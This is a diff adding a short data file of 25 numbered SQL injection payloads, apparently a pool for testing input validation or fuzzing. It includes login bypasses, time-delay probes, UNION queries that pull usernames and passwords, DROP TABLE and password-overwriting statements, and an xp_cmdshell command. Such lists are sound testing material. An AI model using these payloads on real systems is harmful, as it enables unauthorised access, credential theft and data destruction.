@@ -1,0 +1,25 @@
+sqli_pool_0	' OR '1'='1' --
+sqli_pool_1	' OR 1=1 --
+sqli_pool_10	sleep(5)
+sqli_pool_11	'; WAITFOR DELAY '00:00:05'--
+sqli_pool_12	benchmark(1000000,md5(1))
+sqli_pool_13	; SELECT pg_sleep(5);--
+sqli_pool_14	' OR SLEEP(5)--
+sqli_pool_15	extractvalue(1,concat(0x3a,(select database())))
+sqli_pool_16	updatexml(1,concat(0x3a,(select database())),1)
+sqli_pool_17	'||(select user)||'
+sqli_pool_18	1; DROP TABLE users; --
+sqli_pool_19	'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%
+sqli_pool_2	' OR '1'='1'/*
+sqli_pool_20	'; DROP TABLE users; SELECT * FROM customers WHERE name LIKE '%
+sqli_pool_21	'; SELECT * FROM users WHERE 'a'='a
+sqli_pool_22	'; EXEC xp_cmdshell('dir');--
+sqli_pool_23	'; DROP TABLE sessions; --
+sqli_pool_24	' ; UPDATE users SET password='x' --
+sqli_pool_3	1' OR '1'='1' -- 
+sqli_pool_4	admin'--
+sqli_pool_5	UNION SELECT username, password FROM users--
+sqli_pool_6	' UNION SELECT NULL, NULL--
+sqli_pool_7	' UNION ALL SELECT NULL--
+sqli_pool_8	UNION SELECT NULL--
+sqli_pool_9	UNION SELECT username FROM users WHERE '1'='1'
